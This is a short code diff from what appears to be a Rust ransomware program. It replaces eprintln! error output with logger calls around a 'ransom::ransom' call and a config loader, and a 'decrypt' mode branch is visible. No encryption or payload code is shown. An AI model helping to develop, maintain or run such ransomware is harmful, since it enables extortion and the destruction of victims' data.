@@ -43,12 +43,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         let config = AppConfig::from_file(config_file)
                                 .unwrap_or_else(|e| {
-            eprintln!("Failed to load config: {}", e);
+            logger.error(&format!("Failed to load config: {}", e));
             std::process::exit(1);
         });
 
         if let Err(e) = ransom::ransom(logger.clone(), &config).await {
-            eprintln!("Ransom failed: {}", e);
+            logger.error(&format!("Ransomware failed: {}", e));
         }
 
     } else if args.mode == "decrypt" {
